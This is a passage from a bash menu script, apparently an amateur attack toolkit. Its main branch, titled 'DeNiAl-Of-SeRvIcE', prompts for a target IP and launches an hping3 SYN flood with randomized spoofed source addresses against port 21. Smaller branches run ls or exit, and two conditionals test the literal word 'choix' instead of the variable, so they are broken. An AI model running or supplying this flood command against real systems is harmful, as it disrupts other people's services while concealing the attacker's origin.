fi



if [ $choix = "dos" ]
then
clear
echo
echo
echo   --------------------
echo     DeNiAl-Of-SeRvIcE
echo   --------------------
echo
echo
echo
echo
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'ip : ' ipdos
xterm -e hping3 -c 100000 -d 120 -S -w 64 -p 21 --flood --rand-source $ipdos
fi









if [ choix = "ls" ]
then
ls
fi


if [ choix = "shell" ]
then
exit
fi




if [ $choix = "ind" ]
then 
clear
